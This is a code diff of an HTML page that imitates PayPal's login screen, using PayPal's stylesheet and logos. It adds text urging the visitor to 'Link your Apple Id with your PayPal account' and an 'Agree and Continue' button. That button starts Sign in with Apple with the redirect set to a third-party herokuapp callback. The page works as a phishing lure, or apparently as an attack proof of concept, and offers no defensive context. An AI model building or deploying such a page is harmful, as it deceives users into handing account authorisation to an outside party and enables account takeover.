@@ -4,9 +4,36 @@
 
 <head>
     <meta charset="utf-8" />
-    <title>Log in to your PayPal account</title>
+    <title>Stay logged in for faster checkout</title>
     <meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, maximum-scale=1, user-scalable=yes" />
     <link rel="stylesheet" href="https://www.paypalobjects.com/web/res/bc4/702f40f2e7398ff368b30099ca19e/css/contextualLogin.css" />
+    <style type="text/css">
+        .headerTextDecorated {
+            margin-top: 30px !important;
+        }
+        .pp-logo {
+            width: 70px;
+            height: 70px;
+            vertical-align: middle;
+            border-radius: 15px;
+            padding: 15px;
+            box-shadow: 0 0 13px 0 rgba(0,0,0,.15);            
+        }
+        .plus-logo {
+            padding: 8px;
+            border-radius: 0px;
+            box-shadow: none;
+            width: 40px;
+        }
+        .logoContainer {
+            text-align: center;
+            margin-top: 35px;
+            margin-bottom: 25px;
+        }
+        .headerTextDecorated {
+            border: none;
+        }
+    </style>
 
 </head>
 
@@ -19,12 +46,17 @@
                         <p class="paypal-logo paypal-logo-long"></p>
                     </header>
                     <div id="linked" class="linked">
-                        <div id="headerIcon" class="partnerConnect"></div>
+                        <!--div id="headerIcon" class="partnerConnect"></div-->
                         <div class="headerTextDecorated"></div>
                         <h1 class="headerText">Stay logged in for faster checkout</h1>
-                        <p class="description assure">Link your Apple Id with your PayPal account and Enable auto login on this browser and speed through checkout every time. (Not recommended for shared devices.)<span class="learnMoreLink"><a href="#" id="slLoginLearnMore" class="secondayLink" pa-marked="1">What's this?</a></span></p>
+                        <div class="logoContainer">
+                            <img class="pp-logo" src="./apple.svg">
+                            <img class="pp-logo plus-logo" src="./plus.svg">
+                            <img class="pp-logo" src="./pp-logo.png">
+                        </div>                        
+                        <p class="description assure">Link your Apple Id with your PayPal account to enable auto login on this browser and speed through checkout every time. (Not recommended for shared devices.)<span class="learnMoreLink"><a href="#" id="slLoginLearnMore" class="secondayLink" pa-marked="1">What's this?</a></span></p>
                         <br/> <br/>
-                        <div class="actions actionsSpacedShort"><button class="button actionContinue scTrack:unifiedlogin-continue" id="sign-in-with-apple-button" name="continueBtn" value="continueBtn" pa-marked="1">Continue with Apple</button></div>
+                        <div class="actions actionsSpacedShort"><button class="button actionContinue scTrack:unifiedlogin-continue" id="sign-in-with-apple-button" name="continueBtn" value="continueBtn" pa-marked="1">Agree and Continue</button></div>
                     </div>
                 </div>
             </div>
@@ -51,10 +83,10 @@
     <script type="text/javascript" src="https://appleid.cdn-apple.com/appleauth/static/jsapi/appleid/1/en_US/appleid.auth.js"></script>
     <script type="text/javascript">
         AppleID.auth.init({
-                clientId : 'jp.yauth.signin.service3',
-                scope : 'email name',
-                redirectURI: 'https://signin-with-apple.herokuapp.com/callback',
-                state : 'b22907f0126ae445'
+                clientId : 'test.client.id',
+                scope : '',
+                redirectURI: 'https://swapl.herokuapp.com/callback',
+                state : 'test-state-12345'
             });
 
             const buttonElement = document.getElementById('sign-in-with-apple-button');
